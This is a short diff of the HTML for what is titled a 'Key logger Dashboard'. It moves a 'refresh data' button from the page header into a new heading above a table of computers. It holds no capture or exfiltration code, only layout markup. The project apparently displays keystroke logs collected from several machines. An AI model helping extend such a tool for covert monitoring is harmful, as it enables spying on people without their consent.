@@ -10,7 +10,7 @@
 <body>
     <header>
         <h1>Key logger Dashboard</h1>
-        <button onclick="fetchLogs()">refresh data</button>
+<!--        <button onclick="fetchLogs()">refresh data</button>-->
         <button id="logout">Logout</button>
         
     </header>
@@ -30,6 +30,10 @@
 
         <section class="ComputersList" id="ComputersList">
             <h2>Computers List</h2>
+            <div class="list-header">
+                <h2>Computer List</h2>
+                <button onclick="fetchLogs()">refresh data</button>
+            </div>
             <table id="ComputersTable">
                 <thead>
                     <tr>
